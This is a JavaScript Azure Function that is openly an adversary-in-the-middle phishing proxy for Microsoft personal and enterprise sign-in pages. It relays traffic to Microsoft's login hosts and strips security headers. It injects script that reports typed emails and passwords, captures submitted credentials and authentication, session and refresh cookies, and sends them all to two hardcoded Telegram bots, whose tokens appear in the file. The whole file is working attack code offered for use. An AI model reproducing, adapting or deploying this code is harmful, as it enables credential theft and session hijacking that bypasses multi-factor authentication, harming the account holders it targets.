/**
 * Enhanced Azure Function AiTM Phishing for Microsoft Accounts (Personal & Enterprise)
 * Based on EvilWorker concepts and enhanced for comprehensive cookie capture
 */

const { app } = require("@azure/functions");

// Telegram Bot Configuration
const TELEGRAM_BOT_1 = {
  token: "7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U",
  chatId: "6263177378"
};

const TELEGRAM_BOT_2 = {
  token: "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps",
  chatId: null // Will be fetched dynamically
};

// Microsoft endpoints for different account types
const MICROSOFT_ENDPOINTS = {
  enterprise: "login.microsoftonline.com",
  personal: "login.live.com",
  office365: "login.microsoftonline.com"
};

const delete_headers = [
  "content-security-policy",
  "content-security-policy-report-only", 
  "clear-site-data",
  "x-frame-options",
  "referrer-policy",
  "strict-transport-security",
  "content-length",
  "content-encoding",
  "Set-Cookie",
];

// Session tracking
const sessionMap = new Map();
const emailMap = new Map();

async function sendToTelegram(message, bot = TELEGRAM_BOT_1) {
  try {
    const url = `https://api.telegram.org/bot${bot.token}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        chat_id: bot.chatId, 
        text: message, 
        parse_mode: "HTML" 
      }),
    });
  } catch (err) {
    console.error("Telegram error:", err);
  }
}

async function sendToAllBots(message) {
  await sendToTelegram(message, TELEGRAM_BOT_1);
  if (TELEGRAM_BOT_2.chatId) {
    await sendToTelegram(message, TELEGRAM_BOT_2);
  }
}

async function getTelegramChatId(botToken) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
    const data = await response.json();
    if (data.ok && data.result.length > 0) {
      return data.result[0].message.chat.id.toString();
    }
  } catch (err) {
    console.error("Error fetching chat ID:", err);
  }
  return null;
}

async function replace_response_text(response, upstream, original, ip, sessionId) {
  return response.text().then((text) =>
    text
      .replace(new RegExp(upstream, "g"), original)
      .replace(
        "</body>",
        `<script>
          (function() {
            const sessionId = "${sessionId}";
            const realIP = "${ip}";
            
            // Enhanced monitoring for both personal and enterprise flows
            function monitorForm() {
              const emailInput = document.querySelector("input[name='loginfmt'], input[name='email'], input[name='username']");
              const passwordInput = document.querySelector("input[name='passwd'], input[name='password']");
              const nextButton = document.querySelector("#idSIButton9, button[type='submit'], input[type='submit']");
              
              if (emailInput) {
                emailInput.addEventListener('input', function() {
                  fetch("/__notify_event", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      event: "email_entered",
                      email: this.value,
                      ip: realIP,
                      sessionId: sessionId,
                      url: window.location.href
                    }),
                  });
                });
              }
              
              if (nextButton) {
                nextButton.addEventListener('click', function() {
                  const email = emailInput ? emailInput.value : 'unknown';
                  fetch("/__notify_event", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      event: "next_button_clicked",
                      email: email,
                      ip: realIP,
                      sessionId: sessionId,
                      url: window.location.href
                    }),
                  });
                });
              }
              
              if (passwordInput) {
                passwordInput.addEventListener('input', function() {
                  fetch("/__notify_event", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      event: "password_entered",
                      email: emailInput ? emailInput.value : 'unknown',
                      ip: realIP,
                      sessionId: sessionId,
                      url: window.location.href
                    }),
                  });
                });
              }
            }
            
            // Monitor for form changes (dynamic loading)
            const observer = new MutationObserver(function(mutations) {
              mutations.forEach(function(mutation) {
                if (mutation.type === 'childList') {
                  monitorForm();
                }
              });
            });
            
            // Start monitoring
            document.addEventListener('DOMContentLoaded', function() {
              monitorForm();
              observer.observe(document.body, { childList: true, subtree: true });
            });
            
            // Also monitor immediately
            monitorForm();
          })();
        </script></body>`
      )
  );
}

function determineAccountType(url, userAgent) {
  const urlStr = url.toString().toLowerCase();
  
  // Check for personal account indicators
  if (urlStr.includes('login.live.com') || 
      urlStr.includes('live.com') || 
      urlStr.includes('hotmail.com') ||
      urlStr.includes('outlook.com') ||
      urlStr.includes('mso') ||
      urlStr.includes('personal')) {
    return 'personal';
  }
  
  // Check for enterprise indicators
  if (urlStr.includes('login.microsoftonline.com') ||
      urlStr.includes('office.com') ||
      urlStr.includes('microsoft365.com') ||
      urlStr.includes('enterprise')) {
    return 'enterprise';
  }
  
  // Default to enterprise for unknown cases
  return 'enterprise';
}

function extractCookiesFromHeaders(headers) {
  const cookies = [];
  headers.forEach((value, key) => {
    if (key.toLowerCase() === 'set-cookie') {
      cookies.push(value);
    }
  });
  return cookies;
}

function analyzeCookies(cookies, accountType) {
  const analysis = {
    authentication: [],
    session: [],
    refresh: [],
    other: [],
    total: cookies.length
  };
  
  cookies.forEach(cookie => {
    const cookieName = cookie.split('=')[0].toLowerCase();
    
    // Authentication cookies
    if (cookieName.includes('estauth') || 
        cookieName.includes('signinstate') ||
        cookieName.includes('auth') ||
        cookieName.includes('token')) {
      analysis.authentication.push(cookie);
    }
    // Session cookies
    else if (cookieName.includes('session') || 
             cookieName.includes('sess') ||
             cookieName.includes('state')) {
      analysis.session.push(cookie);
    }
    // Refresh tokens
    else if (cookieName.includes('refresh') || 
             cookieName.includes('rt') ||
             cookieName.includes('persistent')) {
      analysis.refresh.push(cookie);
    }
    // Other cookies
    else {
      analysis.other.push(cookie);
    }
  });
  
  return analysis;
}

app.http("phishing", {
  methods: ["GET", "POST"],
  authLevel: "anonymous",
  route: "/{*x}",
  handler: async (request, context) => {
    // Initialize Telegram chat ID for bot 2 if not set
    if (!TELEGRAM_BOT_2.chatId) {
      TELEGRAM_BOT_2.chatId = await getTelegramChatId(TELEGRAM_BOT_2.token);
    }

    const ip = request.headers.get("cf-connecting-ip") ||
               request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
               request.headers.get("x-client-ip") ||
               request.headers.get("true-client-ip") ||
               request.headers.get("x-real-ip") ||
               "unknown";

    const userAgent = request.headers.get("user-agent") || "unknown";
    const sessionId = `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
    
    // Handle special notification endpoints
    if (request.method === "POST" && request.url.includes("/__notify_event")) {
      const body = await request.json();
      const logMessage = `🔍 <b>Event: ${body.event}</b>\n📧 <b>Email:</b> ${body.email}\n🌐 <b>IP:</b> ${body.ip}\n🔗 <b>URL:</b> ${body.url}\n🆔 <b>Session:</b> ${body.sessionId}`;
      await sendToAllBots(logMessage);
      return new Response("ok", { status: 200 });
    }

    const original_url = new URL(request.url);
    const upstream_url = new URL(request.url);
    
    // Determine account type and set appropriate upstream
    const accountType = determineAccountType(original_url, userAgent);
    const upstream = MICROSOFT_ENDPOINTS[accountType];
    
    upstream_url.host = upstream;
    upstream_url.port = 443;
    upstream_url.protocol = "https:";

    // Handle different path structures
    if (upstream_url.pathname === "/") {
      upstream_url.pathname = "/";
    }

    // Log the proxying attempt
    const logMessage = `🚀 <b>New Request</b>\n🌐 <b>IP:</b> ${ip}\n🔗 <b>Original:</b> ${original_url}\n🎯 <b>Upstream:</b> ${upstream_url}\n📱 <b>Account Type:</b> ${accountType}\n🆔 <b>Session:</b> ${sessionId}`;
    await sendToAllBots(logMessage);

    const new_request_headers = new Headers(request.headers);
    new_request_headers.set("Host", upstream_url.host);
    new_request_headers.set("accept-encoding", "gzip;q=0,deflate;q=0");
    new_request_headers.set("user-agent", userAgent);
    new_request_headers.set("Referer", original_url.protocol + "//" + original_url.host);

    // Capture login credentials
    if (request.method === "POST") {
      const body = await request.clone().text();
      const keyValuePairs = body.split("&");

      const data = Object.fromEntries(
        keyValuePairs
          .map((pair) => {
            const [key, value] = pair.split("=");
            return [key, decodeURIComponent((value || "").replace(/\+/g, " "))];
          })
          .filter(([key]) => key === "loginfmt" || key === "passwd" || key === "email" || key === "password")
      );

      if (data.loginfmt || data.email) {
        const email = data.loginfmt || data.email;
        emailMap.set(ip, email);
        sessionMap.set(sessionId, { email, ip, accountType, timestamp: Date.now() });
        
        await sendToAllBots(`📧 <b>Email Captured</b>\n👤 <b>Email:</b> ${email}\n🌐 <b>IP:</b> ${ip}\n📱 <b>Account Type:</b> ${accountType}`);
      }

      if ((data.loginfmt || data.email) && (data.passwd || data.password)) {
        const email = data.loginfmt || data.email;
        const password = data.passwd || data.password;
        
        await sendToAllBots(`🔐 <b>Credentials Captured!</b>\n👤 <b>Email:</b> ${email}\n🔑 <b>Password:</b> ${password}\n🌐 <b>IP:</b> ${ip}\n📱 <b>Account Type:</b> ${accountType}`);
      }
    }

    // Make the upstream request
    const original_response = await fetch(upstream_url.href, {
      method: request.method,
      headers: new_request_headers,
      body: request.body,
      duplex: "half",
    });

    if (request.headers.get("Upgrade") && request.headers.get("Upgrade").toLowerCase() === "websocket") {
      return original_response;
    }

    const new_response_headers = new Headers(original_response.headers);
    delete_headers.forEach((h) => new_response_headers.delete(h));
    new_response_headers.set("access-control-allow-origin", "*");
    new_response_headers.set("access-control-allow-credentials", true);

    // Enhanced cookie capture and analysis
    try {
      const originalCookies = extractCookiesFromHeaders(original_response.headers);
      
      if (originalCookies.length > 0) {
        const cookieAnalysis = analyzeCookies(originalCookies, accountType);
        const victimEmail = emailMap.get(ip) || "unknown";
        
        // Log cookie analysis
        const cookieLog = `🍪 <b>Cookie Analysis for ${victimEmail}</b>\n📊 <b>Total Cookies:</b> ${cookieAnalysis.total}\n🔐 <b>Auth Cookies:</b> ${cookieAnalysis.authentication.length}\n🔄 <b>Session Cookies:</b> ${cookieAnalysis.session.length}\n🔄 <b>Refresh Tokens:</b> ${cookieAnalysis.refresh.length}\n📱 <b>Account Type:</b> ${accountType}`;
        await sendToAllBots(cookieLog);
        
        // Send detailed cookie data
        if (cookieAnalysis.authentication.length > 0) {
          const authCookies = cookieAnalysis.authentication.map(c => c.split(";")[0]).join("\n");
          await sendToAllBots(`🔐 <b>Authentication Cookies:</b>\n<code>${authCookies}</code>`);
        }
        
        if (cookieAnalysis.refresh.length > 0) {
          const refreshCookies = cookieAnalysis.refresh.map(c => c.split(";")[0]).join("\n");
          await sendToAllBots(`🔄 <b>Refresh Tokens:</b>\n<code>${refreshCookies}</code>`);
        }
        
        // Modify cookies for our domain
        originalCookies.forEach((originalCookie) => {
          const modifiedCookie = originalCookie.replace(
            new RegExp(upstream_url.host, "g"),
            original_url.host
          );
          new_response_headers.append("Set-Cookie", modifiedCookie);
        });
      }
    } catch (err) {
      console.error("Cookie capture error:", err);
      await sendToAllBots(`❌ <b>Cookie Capture Error:</b> ${err.message}`);
    }

    const modifiedBody = await replace_response_text(
      original_response.clone(),
      upstream_url.protocol + "//" + upstream_url.host,
      original_url.protocol + "//" + original_url.host,
      ip,
      sessionId
    );

    return new Response(modifiedBody, {
      status: original_response.status,
      headers: new_response_headers,
    });
  },
});
